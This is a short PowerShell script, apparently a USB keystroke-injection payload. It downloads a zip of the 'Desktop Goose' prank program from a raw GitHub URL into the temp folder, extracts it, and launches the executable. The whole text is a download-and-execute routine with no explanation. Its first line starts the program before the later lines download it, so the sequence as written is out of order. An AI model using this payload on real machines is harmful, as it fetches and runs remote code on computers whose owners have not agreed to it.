Start-Process "$env:TEMP\H\GooseDesktop.exe" -WorkingDirectory "$env:TEMP\H"
iwr -Uri "https://raw.githubusercontent.com/csandoval63/GooseDesktopRubberDucky/6f58ce98040f7904d934f3a376b491dab45dcd22/Desktop%20Goose%20v0.21.zip" -OutFile "$env:TEMP\H.zip";
Expand-Archive "$env:TEMP\H.zip" -Dest "$env:TEMP\H" -Force;
(New-Object -ComObject Shell.Application).ShellExecute("$env:TEMP\H\GooseDesktop.exe");